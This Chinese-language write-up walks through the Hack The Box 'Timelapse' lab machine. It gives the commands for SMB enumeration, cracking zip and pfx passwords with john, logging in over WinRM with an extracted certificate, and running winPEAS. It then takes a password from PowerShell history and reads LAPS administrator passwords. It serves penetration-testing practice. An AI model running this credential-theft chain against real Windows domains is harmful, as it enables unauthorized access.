## 前言

Hack The
Box是国外的一个网络安全在线平台，允许用户实践渗透测试技能，并与其他类似兴趣的成员交流想法和方法。它包含一些不断更新的挑战，其中一些模拟真实场景，其中一些更倾向于CTF风格的挑战。

Hack The Box还提供了Rank机制来作为我们挑战的动力，通过通关靶场来去获取积分提高自己的排名。

Hack The Box官网：<https://www.hackthebox.com>

## 如何开始

在注册好账号之后，我们需要去下载两个连接文件。在自己的home页面的右上角有一个Connect to HTB。

![1661766347_630c8acb6dfe37b46040e.png!small?1661766351023](https://image.3001.net/images/20220829/1661766347_630c8acb6dfe37b46040e.png!small?1661766351023)

需要申请这两个连接文件，具体操作参考：[HTB连接](https://blog.csdn.net/zr1213159840/article/details/123489915?ops_request_misc=&request_id=&biz_id=102&utm_term=hacktheboxvpn%E8%BF%9E%E6%8E%A5&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-0-123489915.142%5Ev42%5Epc_ran_alice,185%5Ev2%5Econtrol&spm=1018.2226.3001.4187)

## 正题：Timelapse靶场

### 连接

这是我的两个连接文件，

![1661766857_630c8cc9843d0189face9.png!small?1661766860824](https://image.3001.net/images/20220829/1661766857_630c8cc9843d0189face9.png!small?1661766860824)

利用kali自带的工具进行连接

![1661771759_630c9fefab61bfb484115.png!small?1661771762955](https://image.3001.net/images/20220829/1661771759_630c9fefab61bfb484115.png!small?1661771762955)

![1661771775_630c9fff5c2dc947bb707.png!small?1661771778623](https://image.3001.net/images/20220829/1661771775_630c9fff5c2dc947bb707.png!small?1661771778623)

![1661767210_630c8e2abe69a8405efde.png!small?1661767214068](https://image.3001.net/images/20220829/1661767210_630c8e2abe69a8405efde.png!small?1661767214068)

连接成功。

### 启动靶场

选择好靶机后，点击Join Machine就能启动靶机，靶机会提供一个IP。

![1661767502_630c8f4e8b9510d4e7bcc.png!small?1661767505821](https://image.3001.net/images/20220829/1661767502_630c8f4e8b9510d4e7bcc.png!small?1661767505821)

### 开始测试

靶机IP：10.10.11.152

连通性测试

> ping 10.10.11.152

端口扫描

> nmap -sC -sV -oN myscan.txt 10.10.11.152

通过端口扫描发现，主机开放了一下端口，

![1661767876_630c90c46f99e377d9d6b.png!small?1661767879951](https://image.3001.net/images/20220829/1661767876_630c90c46f99e377d9d6b.png!small?1661767879951)

查看smb共享，

> smbclient -L 10.10.11.152

存在如下共享目录，

![1661768103_630c91a7d29902691654d.png!small?1661768107443](https://image.3001.net/images/20220829/1661768103_630c91a7d29902691654d.png!small?1661768107443)

在Share的Dev目录下发现一个压缩包，

![1661768231_630c9227c55d4200e61bd.png!small?1661768235159](https://image.3001.net/images/20220829/1661768231_630c9227c55d4200e61bd.png!small?1661768235159)

获取压缩包文件（获取可能会失败，多尝试几次），

解压时发现需要解压密码，

利用zip2john进行解密，

提取压缩包的hash值，

> zip2john winrm_backup.zip >> hash

利用字典进行爆破，

> john --wordlist=/home/Password-Top1000（1010）.txt hash

爆破出密码为：supremelegacy。

解压出来的文件还需要密码才能访问，

之前爆破出来的密码不正确不能访问，

pfx文件是经过秘钥加密的，我们可以使用命令openssl进行分析，并且要同时使用pkcs12文件工具，生成和分析pkcs12文件，

导出pfx文件的hash，

> pfx2john legacyy_dev_auth.pfx >pfx_hash

再次利用john爆破密码，

> john --wordlist=/home/PassWord.txt pfx_hash
>
> 密码为：thuglegacy

发现这是个私钥文件，

![1661768785_630c945106b7ed4ffe693.png!small?1661768788303](https://image.3001.net/images/20220829/1661768785_630c945106b7ed4ffe693.png!small?1661768788303)

利用`openssl`进行生成，三个密码都是我们之前生成的得到的`thuglegacy`，得到了私钥文件。

> openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out prv.key

得到私钥文件，还需要生成证书，

> openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt

在开头信息收集的时候看到了开启了5986端口，这个端口是用于横向渗透的端口，可以使用命令`evil-winrm`进行连接。

利用生成的私钥文件和证书进行登陆，

> evil-winrm -i 10.10.11.152 -S -c cert.crt -k prv.key -p -u

登陆密码为我们前面设置的密码，

![1661769165_630c95cd072bd938fe894.png!small?1661769168832](https://image.3001.net/images/20220829/1661769165_630c95cd072bd938fe894.png!small?1661769168832)

成功找到user.txt文件，

![1661769216_630c9600062952508f2f9.png!small?1661769219376](https://image.3001.net/images/20220829/1661769216_630c9600062952508f2f9.png!small?1661769219376)

这样就拿到了userown了，但是目标是要拿到systemown，就需要进行提取。

### 提权

上传提权文件

> upload /home/winPEASx64.exe

[下载地址](https://github.com/carlospolop/PEASS-ng/releases/download/refs%2Fpull%2F260%2Fmerge/winPEASx64.exe)

![1661770425_630c9ab9eeb23bd2d988b.png!small?1661770429392](https://image.3001.net/images/20220829/1661770425_630c9ab9eeb23bd2d988b.png!small?1661770429392)

运行该文件

找到一个历史文件

![1661770625_630c9b81cb615ecc7a2ab.png!small?1661770629217](https://image.3001.net/images/20220829/1661770625_630c9b81cb615ecc7a2ab.png!small?1661770629217)

下载该文件

> download
> C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

查看文件内容

找到一个用户和密码

使用该用户凭证

> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck  
> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force  
> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)

传递命令

> *Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential
> $c -port 5986 -usessl -SessionOption $so -scriptblock {whoami}  
> timelapse\svc_deploy  
> *Evil-WinRM* PS C:\Users> invoke-command -computername localhost -credential
> $c -port 5986 -usessl -SessionOption $so -scriptblock {hostname}  
> dc01

抓取用户凭证

使用`AD-Module`,查看 LAPS 密码

> invoke-command -computername localhost -credential $c -port 5986 -usessl
> -SessionOption $so -scriptblock {Get-ADComputer -Filter * -Properties ms-> Mcs-AdmPwd, ms-Mcs-AdmPwdExpirationTime}

成功获取到administrator的密码。

尝试登陆

> evil-winrm -i 10.10.11.152 -S -u 'administrator' -p
> 'z+&amp4Olgpgn,11t5XbE#x0,2'

成功登陆。

最终在rtx用户的桌面找到root.txt获得系统拥有权。

## 后记

作为一个刚入行的小白，第一次发表文章，求大佬们多多指点！

